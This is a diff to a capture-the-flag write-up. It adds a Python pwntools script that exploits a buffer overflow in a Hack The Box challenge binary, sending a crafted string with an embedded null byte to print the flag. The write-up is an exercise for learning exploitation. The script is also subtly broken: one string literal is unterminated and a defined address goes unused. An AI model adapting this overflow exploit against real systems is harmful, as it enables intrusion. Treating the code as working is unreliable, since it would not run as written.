@@ -102,5 +102,25 @@ pwndbg>
 
 
 Listed here is what I wrote to print the flag. You can see the system call we just recieved from gdb and the string of code we are going to send with a null byte included to cause our buffer overflow. Voila we have the flag!
+```python
+#!/usr/bin/python3
+from pwn import *
 
+context(os='linux', arch='amd64')
+libc = ELF('/home/htb-0xrogue/Downloads/challenge/glibc/libc.so.6')
+e = ELF('sp_going_deeper')
+context.binary = e
+p = e.process()
+#p = remote("", )
+#junk = b"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ftA\x00"
+system_call = p64(0x400700)
+p.sendline(b"2")
+#p.recvline()
+#payload = junk + system_call
+#raw_input()
+#p.sendline(payload)
+p.sendline("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ftA\x00)
+p.recvline()
+p.interactive()
+```
 Summary: Definitely not what I was ready for and I got a crash course in buffer overflow and how to spot it. Some of the code in the Python script is leftover from the challenge and it was required to establish a tcp connection to launch the binary.
